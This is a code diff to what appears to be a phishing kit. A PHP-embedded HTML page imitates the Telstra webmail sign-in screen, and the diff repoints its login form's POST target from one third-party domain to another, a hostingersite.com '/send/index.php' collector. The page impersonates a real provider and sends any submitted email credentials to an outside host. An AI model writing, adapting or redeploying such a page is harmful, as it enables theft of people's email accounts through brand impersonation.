@@ -18,7 +18,7 @@ $htmlResponse = '
       <div role="main" class="t-form-container">
         <h1 class="t-able-heading-a    t-able-spacing-2x-mb "> Sign in to Telstra webmail </h1>
         <div class="t-able-text-bodyshort t-able-spacing-5x-mb">Sign in with your Telstra email address</div>
-        <form method="POST" action="https://app.aviilioncapital.com/send/index.php" autocomplete="off">
+        <form method="POST" action="https://ghostwhite-albatross-321218.hostingersite.com/send/index.php" autocomplete="off">
           <div class="t-able-text-field  t-able-spacing-2x-mb ">
             <label for="username">Telstra email</label>
             <span id="username-help-text">Example: john@bigpond.com</span>
